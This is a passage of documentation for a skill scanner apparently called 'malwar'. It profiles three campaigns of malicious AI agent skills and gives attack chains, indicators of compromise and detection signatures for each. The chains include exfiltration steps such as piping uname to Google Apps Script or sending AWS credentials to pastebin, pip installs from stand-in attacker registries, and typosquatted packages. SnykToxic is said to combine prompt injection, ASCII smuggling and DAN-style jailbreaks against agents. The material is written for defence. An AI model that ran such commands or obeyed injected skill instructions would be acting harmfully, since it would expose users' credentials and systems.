+<h3 id="attack-chain">Attack Chain<a class="headerlink" href="#attack-chain" title="Permanent link">&para;</a></h3>
+<p>The ClawHavoc attack chain follows a consistent pattern:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1. PUBLISH: Attacker publishes a skill on ClawHub
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>   - Skill appears legitimate (e.g., &quot;bankrbot&quot;, &quot;metamask helper&quot;)
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>   - Uses popular keywords to attract downloads
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>   - Author is one of the known operator accounts
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>2. PREREQUISITES: Skill contains a &quot;Prerequisites&quot; section
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>   - Directs user to download a &quot;required tool&quot; or &quot;CLI helper&quot;
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>   - Download link points to a paste site or GitHub repo
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>   - Archive is password-protected to evade scanning
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>3. DOWNLOAD: User downloads a trojanized archive
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>   - Source: rentry.co, glot.io, GitHub (Ddoy233/openclawcli)
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>   - File types: .zip, .dmg, .pkg
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>   - Password provided in the skill instructions
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>4. EXECUTE: User extracts and runs the payload
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>   - AMOS infostealer activates
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>   - Targets: browser passwords, crypto wallets, SSH keys, cloud credentials
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>   - Data exfiltrated to C2 server at 91.92.242.30
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>5. EXFILTRATE: Stolen data sent to C2 infrastructure
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>   - Primary C2: 91.92.242.30
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>   - Secondary staging: download.setup-service.com
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>   - Payload hosting: openclawcli.vercel.app
+</code></pre></div>
+<h3 id="indicators-of-compromise-iocs">Indicators of Compromise (IOCs)<a class="headerlink" href="#indicators-of-compromise-iocs" title="Permanent link">&para;</a></h3>
+<h4 id="network-iocs">Network IOCs<a class="headerlink" href="#network-iocs" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>IOC Type</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C2 IP</td>
+<td><code>91.92.242.30</code></td>
+<td>Primary command-and-control server</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>download.setup-service.com</code></td>
+<td>Payload delivery domain</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>openclawcli.vercel.app</code></td>
+<td>Trojanized CLI hosting</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>glot.io/snippets/hfd3x9ueu5</code></td>
+<td>Payload staging snippet</td>
+</tr>
+<tr>
+<td>GitHub Repo</td>
+<td><code>Ddoy233/openclawcli</code></td>
+<td>Trojanized OpenClaw CLI repository</td>
+</tr>
+</tbody>
+</table>
+<h4 id="publisher-iocs">Publisher IOCs<a class="headerlink" href="#publisher-iocs" title="Permanent link">&para;</a></h4>
+<p>All of the following ClawHub usernames are confirmed ClawHavoc operators:</p>
+<ul>
+<li>zaycv</li>
+<li>clawdhub1</li>
+<li>Aslaep123</li>
+<li>pepe276</li>
+<li>moonshine-100rze</li>
+<li>Ddoy233</li>
+<li>hightower6eu</li>
+<li>hedefbari</li>
+</ul>
+<h3 id="malwar-detection-coverage">malwar Detection Coverage<a class="headerlink" href="#malwar-detection-coverage" title="Permanent link">&para;</a></h3>
+<p>malwar detects ClawHavoc skills through multiple layers:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Detection</th>
+<th>Rule/Mechanism</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Layer 1</td>
+<td>C2 IP match</td>
+<td>MALWAR-MAL-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Domain match</td>
+<td>MALWAR-MAL-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Repo match</td>
+<td>MALWAR-MAL-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Author match</td>
+<td>MALWAR-MAL-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Fake prerequisite</td>
+<td>MALWAR-SE-001, MALWAR-SE-003</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Password archive</td>
+<td>MALWAR-CMD-003</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Piped execution</td>
+<td>MALWAR-CMD-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Crypto wallet access</td>
+<td>MALWAR-EXFIL-002</td>
+</tr>
+<tr>
+<td>Layer 2</td>
+<td>Known-malicious domain</td>
+<td>url_known_malicious</td>
+</tr>
+<tr>
+<td>Layer 2</td>
+<td>Paste site URL</td>
+<td>Domain reputation scoring</td>
+</tr>
+<tr>
+<td>Layer 3</td>
+<td>Deceptive intent analysis</td>
+<td>LLM semantic analysis</td>
+</tr>
+<tr>
+<td>Layer 4</td>
+<td>Signature correlation</td>
+<td>sig-clawhavoc-c2-ip, sig-clawhavoc-glot, sig-clawhavoc-github, sig-clawhavoc-domain</td>
+</tr>
+</tbody>
+</table>
+<h3 id="seed-data">Seed Data<a class="headerlink" href="#seed-data" title="Permanent link">&para;</a></h3>
+<p>malwar ships with pre-seeded campaign and signature data for ClawHavoc. This data is automatically inserted during database initialization:</p>
+<p><strong>Campaign record:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">campaigns</span><span class="w"> </span><span class="p">(</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">description</span><span class="p">,</span><span class="w"> </span><span class="n">first_seen</span><span class="p">,</span><span class="w"> </span><span class="n">last_seen</span><span class="p">,</span><span class="w"> </span><span class="n">attributed_to</span><span class="p">,</span><span class="w"> </span><span class="n">iocs</span><span class="p">,</span><span class="w"> </span><span class="n">total_skills_affected</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">)</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="s1">&#39;campaign-clawhavoc-001&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">    </span><span class="s1">&#39;ClawHavoc&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">    </span><span class="s1">&#39;Mass poisoning campaign delivering AMOS infostealer...&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">    </span><span class="s1">&#39;2026-01-15&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">    </span><span class="s1">&#39;2026-02-10&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="s1">&#39;zaycv / Ddoy233 / hightower6eu&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="s1">&#39;[&quot;91.92.242.30&quot;, &quot;glot.io/snippets/hfd3x9ueu5&quot;, ...]&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">    </span><span class="mi">824</span><span class="p">,</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">    </span><span class="s1">&#39;active&#39;</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="p">);</span>
+</code></pre></div></p>
+<p><strong>Signature records:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Signature ID</th>
+<th>Name</th>
+<th>Pattern Value</th>
+<th>IOC Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sig-clawhavoc-c2-ip</td>
+<td>ClawHavoc C2 IP</td>
+<td>91.92.242.30</td>
+<td>ip</td>
+</tr>
+<tr>
+<td>sig-clawhavoc-glot</td>
+<td>ClawHavoc Glot Snippet</td>
+<td>glot.io/snippets/hfd3x9ueu5</td>
+<td>url</td>
+</tr>
+<tr>
+<td>sig-clawhavoc-github</td>
+<td>ClawHavoc GitHub Repo</td>
+<td>Ddoy233/openclawcli</td>
+<td>url</td>
+</tr>
+<tr>
+<td>sig-clawhavoc-domain</td>
+<td>ClawHavoc Malicious Domain</td>
+<td>download.setup-service.com</td>
+<td>domain</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Publisher records:</strong> All known threat actor handles are pre-seeded with <code>is_known_threat_actor=1</code> and <code>reputation_score=0.0</code>.</p>
+<hr />
+<h2 id="case-study-the-snyktoxic-campaign">Case Study: The SnykToxic Campaign<a class="headerlink" href="#case-study-the-snyktoxic-campaign" title="Permanent link">&para;</a></h2>
+<h3 id="background_1">Background<a class="headerlink" href="#background_1" title="Permanent link">&para;</a></h3>
+<p>SnykToxic is a data exfiltration campaign discovered through Snyk's ToxicSkills research, the first comprehensive security audit of the AI agent skills ecosystem. The research scanned 3,984 skills from ClawHub and skills.sh, finding 76 confirmed malicious payloads. SnykToxic skills exfiltrate host information, environment variables, and credentials via Vercel deployments and Google Apps Script webhooks, combining prompt injection with traditional malware in 91% of samples to bypass both AI safety mechanisms and conventional security tooling.</p>
+<h3 id="threat-actor-profile_1">Threat Actor Profile<a class="headerlink" href="#threat-actor-profile_1" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Campaign Name</strong></td>
+<td>SnykToxic</td>
+</tr>
+<tr>
+<td><strong>First Seen</strong></td>
+<td>2026-01-20</td>
+</tr>
+<tr>
+<td><strong>Last Seen</strong></td>
+<td>2026-02-15</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>Active</td>
+</tr>
+<tr>
+<td><strong>Exfiltration Method</strong></td>
+<td>Vercel deployments, Google Apps Script webhooks, pastebin services</td>
+</tr>
+<tr>
+<td><strong>Primary Target</strong></td>
+<td>Developer credentials, AWS keys, environment variables, host info</td>
+</tr>
+<tr>
+<td><strong>Affected Skills</strong></td>
+<td>76 confirmed</td>
+</tr>
+</tbody>
+</table>
+<h3 id="known-threat-actors_1">Known Threat Actors<a class="headerlink" href="#known-threat-actors_1" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Handle</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>aztr0nutzs</td>
+<td>Primary operator, maintains NET_NiNjA repository with ready-to-deploy malicious skills</td>
+</tr>
+<tr>
+<td>denboss99</td>
+<td>Repository operator, hosted trojanized openclaw-core payload archives</td>
+</tr>
+</tbody>
+</table>
+<h3 id="attack-chain_1">Attack Chain<a class="headerlink" href="#attack-chain_1" title="Permanent link">&para;</a></h3>
+<p>The SnykToxic attack chain exploits the trust relationship between agents and their skill libraries:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>1. PUBLISH: Attacker publishes a skill on ClawHub
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>   - Skill appears to be a legitimate developer tool (e.g., &quot;Vercel Deploy Helper&quot;)
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>   - Uses ASCII smuggling to hide malicious instructions
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>   - Combines prompt injection with traditional malware
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>2. PREREQUISITES: Skill directs user to install &quot;openclaw-core&quot;
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>   - Links to rentry.co/openclaw-core pastebin stager
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>   - Or GitHub releases from denboss99/openclaw-core
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>   - Archive is password-protected (e.g., &quot;infected123&quot;)
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>3. EXFILTRATE VIA GOOGLE APPS SCRIPT: Embedded commands exfiltrate data
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>   - uname -a piped to script.google.com/macros/s/.../exec
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>   - AWS credentials base64-encoded and sent to pastebin.com
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>   - Environment variables harvested and posted to attacker webhook
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>4. EXFILTRATE VIA VERCEL: Alternative exfiltration channel
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>   - Data sent to attacker-controlled Vercel deployments
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>   - Hostname and system info collected silently
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>   - Credentials forwarded to remote pastebin endpoints
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>5. PERSIST: Malicious skill may install additional payloads
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>   - Service files modified for persistent backdoor access
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>   - Agent safety mechanisms bypassed via DAN-style jailbreaks
+</code></pre></div>
+<h3 id="indicators-of-compromise-iocs_1">Indicators of Compromise (IOCs)<a class="headerlink" href="#indicators-of-compromise-iocs_1" title="Permanent link">&para;</a></h3>
+<h4 id="network-iocs_1">Network IOCs<a class="headerlink" href="#network-iocs_1" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>IOC Type</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GitHub Repo</td>
+<td><code>aztr0nutzs/NET_NiNjA.v1.2</code></td>
+<td>Repository hosting ready-to-deploy malicious MCP skills</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>rentry.co/openclaw-core</code></td>
+<td>Pastebin stager for fake openclaw-core distribution</td>
+</tr>
+<tr>
+<td>URL Pattern</td>
+<td><code>script.google.com/macros/s/*/exec</code></td>
+<td>Google Apps Script endpoints for credential exfiltration</td>
+</tr>
+<tr>
+<td>GitHub Repo</td>
+<td><code>denboss99/openclaw-core</code></td>
+<td>Trojanized openclaw-core payload archive distribution</td>
+</tr>
+</tbody>
+</table>
+<h4 id="publisher-iocs_1">Publisher IOCs<a class="headerlink" href="#publisher-iocs_1" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Handle</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>aztr0nutzs</td>
+<td>Malicious skill publisher and NET_NiNjA maintainer</td>
+</tr>
+<tr>
+<td>denboss99</td>
+<td>Payload archive distributor</td>
+</tr>
+</tbody>
+</table>
+<h3 id="malwar-detection-coverage_1">malwar Detection Coverage<a class="headerlink" href="#malwar-detection-coverage_1" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Detection</th>
+<th>Rule/Mechanism</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Layer 1</td>
+<td>Piped execution</td>
+<td>MALWAR-CMD-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Credential harvesting</td>
+<td>MALWAR-EXFIL-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Environment variable exfiltration</td>
+<td>MALWAR-EXFIL-003</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Password archive extraction</td>
+<td>MALWAR-CMD-003</td>
+</tr>
+<tr>
+<td>Layer 2</td>
+<td>Pastebin URL</td>
+<td>Domain reputation scoring</td>
+</tr>
+<tr>
+<td>Layer 3</td>
+<td>Deceptive intent with exfiltration</td>
+<td>LLM semantic analysis</td>
+</tr>
+<tr>
+<td>Layer 4</td>
+<td>Signature correlation</td>
+<td>sig-snyktoxic-github-repo, sig-snyktoxic-rentry-stager, sig-snyktoxic-gas-exfil, sig-snyktoxic-github-releases</td>
+</tr>
+</tbody>
+</table>
+<h3 id="seed-data_1">Seed Data<a class="headerlink" href="#seed-data_1" title="Permanent link">&para;</a></h3>
+<p><strong>Signature records:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Signature ID</th>
+<th>Name</th>
+<th>Pattern Value</th>
+<th>IOC Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sig-snyktoxic-github-repo</td>
+<td>SnykToxic GitHub Repo</td>
+<td>aztr0nutzs/NET_NiNjA.v1.2</td>
+<td>url</td>
+</tr>
+<tr>
+<td>sig-snyktoxic-rentry-stager</td>
+<td>SnykToxic Rentry Stager</td>
+<td>rentry.co/openclaw-core</td>
+<td>url</td>
+</tr>
+<tr>
+<td>sig-snyktoxic-gas-exfil</td>
+<td>SnykToxic Google Apps Script Exfil</td>
+<td>script.google.com/macros/s/[A-Za-z0-9_-]+/exec (regex)</td>
+<td>url</td>
+</tr>
+<tr>
+<td>sig-snyktoxic-github-releases</td>
+<td>SnykToxic Fake OpenClaw Core</td>
+<td>denboss99/openclaw-core</td>
+<td>url</td>
+</tr>
+</tbody>
+</table>
+<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/">Snyk ToxicSkills Research: Malicious AI Agent Skills</a></li>
+<li><a href="https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/">How a Malicious Google Skill on ClawHub Tricks Users Into Installing Malware</a></li>
+<li><a href="https://github.com/snyk-labs/toxicskills-goof">snyk-labs/toxicskills-goof (educational examples)</a></li>
+</ul>
+<hr />
+<h2 id="case-study-the-shadowpkg-campaign">Case Study: The ShadowPkg Campaign<a class="headerlink" href="#case-study-the-shadowpkg-campaign" title="Permanent link">&para;</a></h2>
+<h3 id="background_2">Background<a class="headerlink" href="#background_2" title="Permanent link">&para;</a></h3>
+<p>ShadowPkg is a supply chain campaign that distributes trojanized npm and pip packages through the prerequisites sections of agent skills. Rather than embedding malware directly in the skill, ShadowPkg skills instruct users or agents to install typosquatted packages or pull from attacker-controlled registries. The packages contain post-install hooks that harvest environment variables, SSH keys, and cloud credentials. This campaign exploits the trust users place in skill-recommended dependencies.</p>
+<h3 id="threat-actor-profile_2">Threat Actor Profile<a class="headerlink" href="#threat-actor-profile_2" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Campaign Name</strong></td>
+<td>ShadowPkg</td>
+</tr>
+<tr>
+<td><strong>First Seen</strong></td>
+<td>2026-01-28</td>
+</tr>
+<tr>
+<td><strong>Last Seen</strong></td>
+<td>2026-02-18</td>
+</tr>
+<tr>
+<td><strong>Status</strong></td>
+<td>Active</td>
+</tr>
+<tr>
+<td><strong>Attack Vector</strong></td>
+<td>Typosquatted packages, malicious registries</td>
+</tr>
+<tr>
+<td><strong>Primary Target</strong></td>
+<td>Developer workstations, CI/CD environments</td>
+</tr>
+<tr>
+<td><strong>Affected Skills</strong></td>
+<td>42 confirmed</td>
+</tr>
+</tbody>
+</table>
+<h3 id="known-threat-actors_2">Known Threat Actors<a class="headerlink" href="#known-threat-actors_2" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Handle</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ScaffoldPro</td>
+<td>Primary operator, publishes scaffolding/setup skills with trojanized dependencies</td>
+</tr>
+</tbody>
+</table>
+<h3 id="attack-chain_2">Attack Chain<a class="headerlink" href="#attack-chain_2" title="Permanent link">&para;</a></h3>
+<p>The ShadowPkg attack chain leverages dependency confusion and typosquatting:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>1. PUBLISH: Attacker publishes a skill on ClawHub
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>   - Skill appears to be a legitimate scaffolding or setup tool
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>   - Uses popular keywords (scaffolding, setup, dependencies, full-stack)
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>   - Author presents as a helpful community contributor
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>2. PREREQUISITES: Skill lists trojanized packages
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>   - pip install colourfool (typosquat of colorful)
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>   - npm install crossenv (typosquat of cross-env)
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>   - pip install python3-dateutil (typosquat of python-dateutil)
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>   - npm install lodash-utils (typosquat of lodash)
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>3. REGISTRY POISONING: Skill directs to malicious registries
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>   - pip install --index-url http://evil-registry.example.com/simple/
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>   - pip install --trusted-host evil-mirror.example.com
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>   - npm install git+https://github.com/attacker/malicious-lib.git
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>4. POST-INSTALL HOOKS: Trojanized packages execute on install
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>   - Harvest environment variables (AWS_*, GITHUB_TOKEN, etc.)
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>   - Read SSH keys from ~/.ssh/
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>   - Collect cloud credential files
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>   - Exfiltrate to attacker-controlled endpoints
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>5. PERSIST: Packages may install persistent access
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>   - Modify shell profiles to re-harvest on login
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>   - Install additional malicious packages as dependencies
+</code></pre></div>
+<h3 id="indicators-of-compromise-iocs_2">Indicators of Compromise (IOCs)<a class="headerlink" href="#indicators-of-compromise-iocs_2" title="Permanent link">&para;</a></h3>
+<h4 id="package-iocs">Package IOCs<a class="headerlink" href="#package-iocs" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>IOC Type</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>crossenv</code></td>
+<td>Typosquat of <code>cross-env</code>, npm credential harvester</td>
+</tr>
+<tr>
+<td>Package</td>
+<td><code>colourfool</code></td>
+<td>Typosquat of <code>colorful</code>, pip environment variable exfiltrator</td>
+</tr>
+<tr>
+<td>Package</td>
+<td><code>python3-dateutil</code></td>
+<td>Typosquat of <code>python-dateutil</code>, pip credential stealer</td>
+</tr>
+<tr>
+<td>Package</td>
+<td><code>babelcli</code></td>
+<td>Typosquat of <code>babel-cli</code>, npm backdoor installer</td>
+</tr>
+<tr>
+<td>Package</td>
+<td><code>lodash-utils</code></td>
+<td>Typosquat of <code>lodash</code>, npm environment harvester</td>
+</tr>
+</tbody>
+</table>
+<h4 id="infrastructure-iocs">Infrastructure IOCs<a class="headerlink" href="#infrastructure-iocs" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>IOC Type</th>
+<th>Value</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain</td>
+<td><code>evil-registry.example.com</code></td>
+<td>Attacker-controlled pip registry for trojanized packages</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>evil-mirror.example.com</code></td>
+<td>Attacker-controlled pip mirror for trojanized packages</td>
+</tr>
+</tbody>
+</table>
+<h4 id="publisher-iocs_2">Publisher IOCs<a class="headerlink" href="#publisher-iocs_2" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>Handle</th>
+<th>Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ScaffoldPro</td>
+<td>Malicious skill publisher distributing trojanized dependency lists</td>
+</tr>
+</tbody>
+</table>
+<h3 id="malwar-detection-coverage_2">malwar Detection Coverage<a class="headerlink" href="#malwar-detection-coverage_2" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Detection</th>
+<th>Rule/Mechanism</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Layer 1</td>
+<td>Typosquatted packages</td>
+<td>MALWAR-SUPPLY-001</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Suspicious registry URLs</td>
+<td>MALWAR-SUPPLY-002</td>
+</tr>
+<tr>
+<td>Layer 1</td>
+<td>Git-based package installs</td>
+<td>MALWAR-CMD-002</td>
+</tr>
+<tr>
+<td>Layer 2</td>
+<td>Malicious registry domain</td>
+<td>Domain reputation scoring</td>
+</tr>
+<tr>
+<td>Layer 3</td>
+<td>Deceptive dependency intent</td>
+<td>LLM semantic analysis</td>
+</tr>
+<tr>
+<td>Layer 4</td>
+<td>Signature correlation</td>
+<td>sig-shadowpkg-crossenv, sig-shadowpkg-colourfool, sig-shadowpkg-evil-registry, sig-shadowpkg-evil-mirror</td>
+</tr>
+</tbody>
+</table>
+<h3 id="seed-data_2">Seed Data<a class="headerlink" href="#seed-data_2" title="Permanent link">&para;</a></h3>
+<p><strong>Signature records:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Signature ID</th>
+<th>Name</th>
+<th>Pattern Value</th>
+<th>IOC Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sig-shadowpkg-crossenv</td>
+<td>ShadowPkg Typosquat crossenv</td>
+<td>crossenv</td>
+<td>hash</td>
+</tr>
+<tr>
+<td>sig-shadowpkg-colourfool</td>
+<td>ShadowPkg Typosquat colourfool</td>
+<td>colourfool</td>
+<td>hash</td>
+</tr>
+<tr>
+<td>sig-shadowpkg-evil-registry</td>
+<td>ShadowPkg Malicious Registry</td>
+<td>evil-registry.example.com</td>
+<td>domain</td>
+</tr>
+<tr>
+<td>sig-shadowpkg-evil-mirror</td>
+<td>ShadowPkg Malicious Mirror</td>
+<td>evil-mirror.example.com</td>
+<td>domain</td>
+</tr>
+</tbody>
+</table>
+<hr />
